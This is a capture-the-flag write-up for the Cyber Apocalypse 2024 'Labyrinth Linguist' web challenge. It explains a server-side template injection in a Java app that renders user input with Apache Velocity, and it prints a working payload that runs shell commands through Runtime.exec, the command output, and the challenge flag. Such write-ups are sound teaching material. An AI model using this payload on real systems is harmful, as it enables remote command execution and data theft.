# Cyber Apocalypse 2024

## Labyrinth Linguist

> You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.
> 
> Author: Lean
> 
> [`web_labyrinth_linguist.zip`](web_labyrinth_linguist.zip)

Tags: _web_

## Solution
The provided webapp lets us translate a english text to `voxalith`. Interesting... Lets see how this is implemented.

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Labyrinth Linguist 🌐</title>
    <link rel="stylesheet" href="/css/style.css">
</head>
<body>
    <form class="fire-form" action="" method="post">
        <span class="fire-form-text">Enter text to translate english to voxalith!</span><br><br>
        <input class="fire-form-input" type="text" name="text" value="">
        <input class="fire-form-button" type="submit" value="Submit →">
    </form>
    <h2 class="fire">TEXT</h2>
</body>
</html>
```

```java
@RequestMapping("/")
@ResponseBody
String index(@RequestParam(required = false, name = "text") String textString) {
    if (textString == null) {
            textString = "Example text";
    }

    String template = "";

    try {
        template = readFileToString("/app/src/main/resources/templates/index.html", textString);
    } catch (IOException e) {
        e.printStackTrace();
    }

    RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
    StringReader reader = new StringReader(template);

    org.apache.velocity.Template t = new org.apache.velocity.Template();
    t.setRuntimeServices(runtimeServices);
    try {

            t.setData(runtimeServices.parse(reader, "home"));
            t.initDocument();
            VelocityContext context = new VelocityContext();
            context.put("name", "World");

            StringWriter writer = new StringWriter();
            t.merge(context, writer);
            template = writer.toString();

    } catch (ParseException e) {
            e.printStackTrace();
    }

    return template;
}

public static String readFileToString(String filePath, String replacement) throws IOException {
    StringBuilder content = new StringBuilder();
    BufferedReader bufferedReader = null;

    try {
        bufferedReader = new BufferedReader(new FileReader(filePath));
        String line;

        while ((line = bufferedReader.readLine()) != null) {
            line = line.replace("TEXT", replacement);
            content.append(line);
            content.append("\n");
        }
    } finally {
        if (bufferedReader != null) {
            try {
                bufferedReader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    return content.toString();
}
```

We can see our template html is read and the word `TEXT` is replaced with our input. Then the page is rendered with [`Velocity`](https://velocity.apache.org/). Knowing the template engine in use we can do some research for potential `SSTI` options.

```java
#set($str="")
#set($string=$str.getClass().forName("java.lang.String"))
#set($char=$str.getClass().forName("java.lang.Character")) #set($ex=$str.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("ls /"))
$ex.waitFor()
#set($out = $ex.getInputStream())
#foreach($i in [1..$out.available()])$string.valueOf($char.toChars($out.read()))#end
```

Perfect, this gives us the listing of the root directory.

```bash
, 0 app
bin
boot
dev
entrypoint.sh
etc
flag6be55db8d2.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

Now we know the name of the flag we can adapt the command in the previous payload from `ls /` to `cat /flag6be55db8d2.txt` to get the flag.

Flag `HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}`